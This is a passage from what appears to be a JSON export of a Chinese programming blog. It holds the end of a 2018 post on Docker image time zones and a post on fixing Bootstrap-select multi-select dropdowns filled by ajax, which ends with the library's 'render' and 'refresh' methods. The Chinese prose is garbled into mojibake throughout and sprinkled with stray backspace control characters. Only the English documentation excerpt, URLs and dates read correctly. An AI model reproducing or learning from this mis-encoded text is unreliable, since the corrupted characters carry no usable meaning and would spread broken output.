å¯è§ï¼ŒCSTå¯ä»¥åŒæ—¶è¡¨ç¤ºç¾å›½ï¼Œæ¾³å¤§åˆ©äºšï¼Œä¸­å›½ï¼Œå¤å·´å››ä¸ªå›½å®¶çš„æ ‡å‡†æ—¶é—´ã€‚ --------------------------------- éƒ¨åˆ†æ¥è‡ªCSDNåšå®¢ï¼Œè½¬è½½è¯·æ ‡æ˜å‡ºå¤„ï¼š http://www.51testing.com/html/74/248074-209865.html ","date":"2018-01-28T01:01:00Z","permalink":"https://blog.zeddyu.info/2018/01/28/Docker%E9%95%9C%E5%83%8F%E7%9A%84%E6%97%B6%E9%97%B4%E9%97%AE%E9%A2%98/","title":"Dockeré•œåƒçš„æ—¶é—´é—®é¢˜"},{"content":"é¡¹ç›®ä¸­éœ€è¦ç”¨åˆ°çš„æ˜¯å¤šé€‰ä¸‹æ‹‰æ¡†ï¼Œç”±äºé¡¹ç›®ç”¨çš„æ˜¯bootstrapï¼Œæˆ‘ä¾¿æ‰¾åˆ°äº†bootstrap-selectè¿™ä¸ªå¯ä»¥æä¾›å¤šé€‰ä¸‹æ‹‰æ¡†çš„åº“ã€‚\nå› ä¸ºè¿™ä¸ªé¡¹ç›®æ˜¯ç”¨ajaxè·å–æ•°æ®ç„¶åæŠŠæ•°æ®æ”¾å…¥selectä¸­çš„ï¼Œè€ŒåŸç”Ÿçš„select multipleåˆå®åœ¨æ˜¯å¤ªåƒµç¡¬\n\u0026lt;select multiple\u0026gt; \u0026lt;option\u0026gt;æ²¡é”™\u0026lt;/option\u0026gt; \u0026lt;option\u0026gt;å°±æ˜¯\u0026lt;/option\u0026gt; \u0026lt;option\u0026gt;è¿™ä¹ˆ\u0026lt;/option\u0026gt; \u0026lt;option\u0026gt;åƒµç¡¬\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; æŸ¥äº†ä¸€ä¸‹w3c\nå®šä¹‰å’Œç”¨æ³• multiple å±æ€§è§„å®šå¯åŒæ—¶é€‰æ‹©å¤šä¸ªé€‰é¡¹ã€‚ åœ¨ä¸åŒæ“ä½œç³»ç»Ÿä¸­ï¼Œé€‰æ‹©å¤šä¸ªé€‰é¡¹çš„å·®å¼‚ï¼š å¯¹äº windowsï¼šæŒ‰ä½ Ctrl æŒ‰é’®æ¥é€‰æ‹©å¤šä¸ªé€‰é¡¹ å¯¹äº Macï¼šæŒ‰ä½ command æŒ‰é’®æ¥é€‰æ‹©å¤šä¸ªé€‰é¡¹ ç”±äºä¸Šè¿°å·®å¼‚çš„å­˜åœ¨ï¼ŒåŒæ—¶ç”±äºéœ€è¦å‘ŠçŸ¥ç”¨æˆ·å¯ä»¥ä½¿ç”¨å¤šé¡¹é€‰æ‹©ï¼Œå¯¹ç”¨æˆ·æ›´å‹å¥½çš„æ–¹å¼æ˜¯ä½¿ç”¨å¤é€‰æ¡†ã€‚ æç¤ºï¼šå¯ä»¥æŠŠ multiple å±æ€§ä¸ size å±æ€§é…åˆä½¿ç”¨ï¼Œæ¥å®šä¹‰å¯è§é€‰é¡¹çš„æ•°ç›® åƒµç¡¬çš„ä¸è¡Œã€‚æ„Ÿè§‰è‡ªå·±å†™çš„è¯ï¼Œä¸€æ–¹é¢è‡ªå·±èƒ½åŠ›ä¸è¶³å§ï¼Œå¦ä¸€æ–¹é¢æ˜¯åº”è¯¥ä¼šæœ‰ä¸€å¤§å †çš„åº“ï¼Œè‡ªå·±å†™æ„Ÿè§‰\u0008å¤ªæµªè´¹æ—¶é—´ï¼Œæ‰€ä»¥è‡ªå·±å°±å»ç½‘ä¸Šéšä¾¿æœäº†ä¸€ä¸‹ï¼Œå°±å‘ç°äº†Bootstrap-selectè¿™ä¸ªåº“ï¼Œçœ‹èµ·æ¥\u0008å¾ˆç¬¦åˆè¦æ±‚ï¼é‚£å°±å†³å®šæ˜¯å®ƒå•¦ï¼\nç„¶å\u0008å‘ç°çš„ä¸€ä¸ªé—®é¢˜æ˜¯å› ä¸ºé¡¹ç›®ç”¨åˆ°çš„\u0008æ•°æ®æ˜¯\u0008é€šè¿‡ajaxæ¥è·å–çš„ï¼Œè€Œä¸”æˆ‘ä»¬è¿˜ç”¨çš„æ˜¯jqueryæ‹¼æ¥çš„å½¢å¼ï¼Œæ‰€ä»¥æ˜¯\u0008htmlæ˜¯\u0026lt;select ...\u0026gt;\u0026lt;/select\u0026gt;,jsæ–‡ä»¶æ‹¼æ¥æ˜¯\u0026lt;option\u0026gt;...\u0026lt;/option\u0026gt;,ä½†æ˜¯å°±æ˜¯è¿™æ ·å‡ºç°äº†é—®é¢˜ï¼Œå¹¶æ²¡æœ‰æ˜¾ç¤ºå‡ºæˆ‘ä»¬æƒ³è¦çš„æ•ˆæœï¼Œ\u0008æ²¡æœ‰æ˜¾ç¤ºå‡ºæœ‰\u0008æ•°æ®çš„ä¸‹æ‹‰æ¡†ã€‚å½“æ—¶æ„Ÿè§‰æ¯”è¾ƒå¥‡æ€ªï¼Œæ„Ÿè§‰æ˜¯æ¡†æ¶çš„é—®é¢˜ï¼Œåˆé‡æ–°è¯•äº†\u0008å‡ æ¬¡ï¼Œå‘ç°åªæœ‰åœ¨htmlæ–‡ä»¶é‡Œå†™optionæ ‡ç­¾æ‰èƒ½æ­£å¸¸æ˜¾ç¤ºä¸‹æ‹‰æ¡†æ•ˆæœï¼Œå°±æ¯”è¾ƒéƒé—·ã€‚\næ¥ç€ä¹‹åå°±åˆå»æ‰¾å¦ä¸€ä¸ªåº“ï¼Œç„¶åå‘ç°äº†Amaze\u0008è¿™ä¸ªå‰ç«¯æ¡†æ¶ï¼Œæœ‰å¤šé€‰ï¼Œåˆå¥½çœ‹ï¼Œåªä¸è¿‡å¦‚æœè¦æ”¹ï¼Œ\u0008æ”¹çš„æˆæœ¬ä¼šå¾ˆå¤§ï¼Œé¡µé¢åŸºæœ¬éƒ½å¾—æ”¹ã€‚\u0008å½“æ—¶è§‰å¾—ä¸ºäº†è¿™ä¸ªå¤šé€‰ï¼Œä¸€æ–¹é¢æ˜¯\u0008Bootstrap 3å·²ç»ç”¨çƒ‚äº†ï¼Œä¸æ€ä¹ˆå¥½çœ‹ï¼Œä¸€æ–¹é¢ä¹Ÿæ˜¯ä¸ºäº†å¤šé€‰ï¼Œè¯´æ¢å°±æ¢ã€‚ç„¶ååŸºæœ¬æŠŠå‡ ä¸ªé¡µé¢é‡æ„äº†ã€‚ç»“æœå‘ç°å¾ˆç´¯ï¼Œè€Œä¸”å‡ºç°äº†æ— æ³•è·å–Amaze selecté€‰ä¸­çš„optionçš„å€¼ï¼Œå°±æ¯”è¾ƒçƒ¦ï¼ŒåŸæœ¬åŠŸèƒ½å®Œå¥½çš„é¡µé¢è¢«è¿™ä¹ˆä¸€æŠ˜è…¾ï¼Œ\u0008åŸºæœ¬åŠŸèƒ½éƒ½ä¸å¥½äº†ã€‚åæ¥å› ä¸ºä¸€äº›äº‹æœ‰ä¸€æ®µæ—¶é—´\u0008æ²¡ç†è¿™ä¸ªé—®é¢˜äº†ã€‚\nå¥½ä¸å®¹æ˜“\u0008æœ‰æ—¶é—´æŠ½å‡ºç©ºæ¥ï¼Œå½“æ—¶\u0008å·²ç»å¿˜äº†ä¹‹å‰\u0008åšè¿‡ä»€ä¹ˆäº†ï¼Œå°±æ„Ÿè§‰Amazeè¿™ä¸ªè§£å†³ä¸äº†ï¼Œå°±åˆå»æ‰¾å¤šé€‰çš„ä¸‹æ‹‰æ¡†æ¶ï¼Œè¿™æ ·åˆæ‰¾å›äº†Bootstrap-selectè¿™ä¸ªåº“ï¼Œç„¶åç”¨ï¼Œè‡³å°‘èƒ½æ‹¯æ•‘åŸºæœ¬åŠŸèƒ½ï¼Œæ‰€ä»¥\u0008åˆæ”¾å¼ƒäº†é‡æ„åˆ°40%å·¦å³çš„Amazeæ¡†æ¶ï¼Œåˆšå¥½é‚£æ—¶å€™Bootstrap 4å®˜æ–¹æ–‡æ¡£å‡ºæ¥äº†ï¼Œå·²ç»æ˜¯æ­£å¼ç‰ˆäº†ï¼Œå°±æ¢ä¸Šäº†4ï¼Œç»“æœBootstrap-selectè¿™ä¸ªåº“\u0008å®˜ç½‘çš„ç‰ˆæœ¬è¿˜æ²¡æœ‰\u0008æ”¯æŒBootstrap 4ï¼Œå¯æ˜¯é¡¹ç›®æˆ‘åˆæ”¹äº†æŒºå¤šçš„æ”¹æˆäº†4ï¼Œè¿™æ ·æ”¹æ¥æ”¹å»ä¸æ˜¯é—®é¢˜å•Šã€‚\näºæ˜¯æˆ‘æƒ³èµ·äº†ä¹‹å‰æŸä½\u0008é«˜äººè·Ÿæˆ‘è¯´è§£å†³é—®é¢˜çš„æ–¹æ³•ï¼Œ\u0008å¦‚æœé‡åˆ°é—®é¢˜åªæ˜¯æ¢æ¡†æ¶ï¼Œä¸å»è¿½ç©¶\u0008æ€ä¹ˆè§£å†³ï¼Œé‚£å§‹ç»ˆæ˜¯ä¸ªsdkæ¬è¿å·¥ã€‚\nä¸€æ–¹é¢æ„Ÿè§‰è‡ªå·±è¿™æ ·ä¸‹å»ä¸æ˜¯åŠæ³•ï¼Œ\u0008å¦ä¸€æ–¹é¢æ˜¯è‡ªå·±ä¹Ÿå¹¶ä¸æƒ³åªåšä¸ª\u0008æ¬è¿å·¥ï¼Œè‡³å°‘å¾—æ˜¯ä¸ªé«˜çº§\u0008æ¬è¿å·¥å§:)\nç„¶åé™ä¸‹æ¥ï¼Œä¸€ä¸ªä¸ªé—®é¢˜å»æœï¼ŒåŸºæœ¬ä¹Ÿ\u0008éƒ½æœ‰ï¼Œæ¯”å¦‚\u0008å› ä¸ºBootstrap 4æ­£å¼ç‰ˆåˆšå‡ºæ¥ï¼Œselectåº“è¿˜æ²¡æœ‰å®˜ç½‘åœ°ä¸Šçº¿æ”¯æŒï¼Œä½†æ˜¯åœ¨ä»–çš„githubä¸Šå·²ç»æœ‰issueäº†ï¼Œ\u0008ä¹Ÿæä¾›äº†æœ€æ–°çš„æ”¯æŒç‰ˆæœ¬ã€‚\n\u0008æ¥ç€ï¼Œè§£å†³aja\u0008xçš„é—®é¢˜ï¼Œä¸ªäººå½“åˆè§‰å¾—æ˜¯å› ä¸ºæ•°æ®å‘é€åœ¨é¡µé¢æ¸²æŸ“ä¹‹åï¼Œå¯¼è‡´é¡µé¢æ²¡æœ‰åŠæ—¶çš„æŠŠç»„ä»¶æ¸²æŸ“å‡ºæ¥ï¼Œå½“æ—¶æ˜¯æç½®äº†ä¸€å¤©å·¦å³ï¼Œä¹Ÿæ‡’å¾—å»æ‰¾ç­”æ¡ˆï¼Œåæ¥éšä¾¿ä¸€æœåˆæœåˆ°äº†è¯¥é—®é¢˜ã€‚é™„ä¸ŠåŸé“¾æ¥ï¼Œç„¶ååˆæ˜¯å¤šé€‰æ¡†çš„\u0008é€‰ä¸­\u0008optionçš„å€¼çš„è·å–é—®é¢˜ï¼Œ\u0008åªè¦æœä¸€æœå°±èƒ½\u0008æ‰¾åˆ°äº†ã€‚\n\u0008å…¶å®å§ï¼Œè¿™æ¬¡ç¢°åˆ°çš„é—®é¢˜éƒ½å¾ˆç®€å•ï¼Œ\u0008ä½†æ˜¯è‡ªå·±å¤„ç†èµ·æ¥æ„Ÿè§‰\u0008æå…¶xxï¼Œ\u0008è€Œä¸”ç¹çï¼Œæœ€\u0008\u0008ä¸»è¦çš„æ˜¯æ–‡æ¡£å¾ˆé‡è¦ï¼Œå°±æ¯”å¦‚Bootstrap-selectæ–‡æ¡£æ˜æ˜å°±å†™æœ‰å¾ˆå¤š\u0008method\n.selectpicker('render') You can force a re-render of the bootstrap-select ui with the render method. This is useful if you programatically change any underlying values that affect the layout of the element. $('.selectpicker').selectpicker('render'); .selectpicker('refresh') To programmatically update a select with JavaScript, first manipulate the select, then use the refresh method to update the UI to match the new state. This is necessary when removing or adding options, or when disabling/enabling a select via JavaScript. $('.selectpicker').selectpicker('refresh'); åè€Œè‡ªå·±èˆè¿‘æ±‚è¿œï¼Œå¼„çš„ç›¸å½“å¤æ‚ï¼ŒåŒæ—¶å¦‚æœæœ‰githubï¼Œgithubçš„issueä¹Ÿæ˜¯ä¸€ä¸ª\u0008éå¸¸é‡è¦çš„\u0008è§£å†³æ–¹æ³•çš„é€”å¾„ã€‚\næœ¬æ–‡å°±æƒ³è®°è¿°ä¸€ä¸‹è‡ªå·±è§£å†³é—®é¢˜æ—¶å€™çš„æ–¹æ³•ï¼Œé—®é¢˜æœ‰å¾ˆå¤šï¼Œæ–¹æ³•ä¹Ÿå¯ä»¥æœ‰å¾ˆå¤šï¼Œä¹Ÿå¯ä»¥æœ‰å¾ˆå¿«çš„æ–¹æ³•ï¼Œå¸Œæœ›é€šè¿‡è¿™æ¬¡èƒ½æé«˜ä¸€ä¸‹è‡ªå·±è§£å†³é—®é¢˜çš„èƒ½åŠ›ï¼Œä¸å†æ˜¯ä¸€ä¸ªsdkæ¬è¿å·¥:)\n","date":"2018-01-27T00:38:00Z","permalink":"https://blog.zeddyu.info/2018/01/27/Bootstrap-select%E7%A2%B0%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/","title":"Bootstrap-selectç¢°åˆ°çš„ä¸€äº›é—®é¢˜"}]